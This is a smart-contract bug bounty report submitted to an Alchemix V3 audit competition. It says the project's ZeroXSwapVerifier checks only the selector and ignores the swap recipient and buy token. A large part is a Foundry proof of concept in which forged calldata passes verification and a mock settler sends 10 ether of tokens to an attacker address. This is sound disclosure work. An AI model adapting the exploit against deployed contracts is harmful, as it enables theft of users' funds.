# 57777 sc low zerox swap verifier bypass enables direct theft of user funds

**Submitted on Oct 28th 2025 at 20:49:56 UTC by @niffylord for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57777
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief / Intro

`ZeroXSwapVerifier.verifySwapCalldata` only checks the function selector, then applies incomplete parsing of action payloads. Crucially, it never validates the recipient or buy token for the swap. An attacker can craft calldata that passes verification but routes MYT (or underlying) to an arbitrary address, enabling direct theft of assets.

### Vulnerability Details

* The verifier (`src/utils/ZeroXSwapVerifier.sol:99-143`) accepts any target so long as the selector matches 0x’s settler. It does not check the actual settler address.
* `_verifyExecuteCalldata` / `_verifyExecuteMetaTxnCalldata` ignore `SlippageAndActions.recipient` and `buyToken` (TODO comments in code) and many action decoders just slice the first 32/64 bytes of dynamic data (`_extractTokenFromUniswapFills`, `_extractTokenAndAmountFromRFQ`).
* Because the parser trusts those slices, attackers can encode actions whose first word matches the expected token while the real calldata points to another asset/recipient. Verification returns true, but the actual 0x execution transfers funds elsewhere.

### Impact Details

Impact: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield** (High severity)

* A malicious strategy or external actor can submit forged calldata that the verifier approves, allowing them to drain tokens held in strategies guarded by this verifier.
* The attacker can redirect proceeds of swaps to their address, emptying strategy balances.

### References

* `src/utils/ZeroXSwapVerifier.sol` lines 99-299 (selector check + action decoders)
* PoC test: `src/test/poc/ZeroXSwapVerifierPoC.t.sol`

## Proof of Concept

1. Ensure Foundry is installed and dependencies are set.
2. Execute the dedicated tests:

   ```bash
   forge test --match-test test_poc_zeroXSwapVerifier_ignores_recipient -vv
   forge test --match-test test_poc_zeroXSwapVerifier_drains_tokens -vv
   ```
3. `test_poc_zeroXSwapVerifier_ignores_recipient` demonstrates the verifier greenlights calldata pointing to an attacker-controlled recipient.
4. `test_poc_zeroXSwapVerifier_drains_tokens` connects the verifier to a mocked 0x settler execution path and shows the attacker’s balance increasing by the stolen amount.

### PoC Source

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {AlchemistV3Test} from "../AlchemistV3.t.sol";
import {ZeroXSwapVerifier} from "../../utils/ZeroXSwapVerifier.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockZeroXSettler {
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;

    function execute(ZeroXSwapVerifier.SlippageAndActions calldata saa, bytes[] calldata) external {
        for (uint256 i = 0; i < saa.actions.length; i++) {
            bytes calldata action = saa.actions[i];
            if (bytes4(action[0:4]) == TRANSFER_FROM) {
                (address token, address from, address to, uint256 amount) = abi.decode(action[4:], (address, address, address, uint256));
                IERC20(token).transferFrom(from, to, amount);
            }
        }
    }
}

contract ZeroXSwapVerifierPoC is AlchemistV3Test {
    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f;
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;
    MockZeroXSettler private settler = new MockZeroXSettler();

    function test_poc_zeroXSwapVerifier_ignores_recipient() external {
        address attacker = address(0xdeadbeef);
        address targetToken = address(mockStrategyYieldToken);

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeWithSelector(
            TRANSFER_FROM,
            targetToken,
            address(this),
            attacker,
            10 ether
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,
            buyToken: targetToken,
            minAmountOut: 0,
            actions: actions
        });

        bytes memory calldata_ = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));

        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            calldata_,
            address(this),
            targetToken,
            1_000
        );

        emit log_named_address("Unchecked recipient", attacker);
        assertTrue(verified, "verification unexpectedly failed");
    }

    function test_poc_zeroXSwapVerifier_drains_tokens() external {
        address attacker = address(0xdeadbeef);
        address targetToken = address(mockStrategyYieldToken);

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeWithSelector(
            TRANSFER_FROM,
            targetToken,
            address(this),
            attacker,
            10 ether
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,
            buyToken: targetToken,
            minAmountOut: 0,
            actions: actions
        });

        bytes memory calldata_ = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));

        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            calldata_,
            address(this),
            targetToken,
            1_000
        );
        assertTrue(verified, "verification unexpectedly failed");

        deal(targetToken, address(this), 100 ether);
        IERC20(targetToken).approve(address(settler), type(uint256).max);

        uint256 attackerBefore = IERC20(targetToken).balanceOf(attacker);
        settler.execute(saa, new bytes[](0));
        uint256 attackerAfter = IERC20(targetToken).balanceOf(attacker);

        assertEq(attackerAfter, attackerBefore + 10 ether, "attacker should receive stolen funds");
    }
}
```
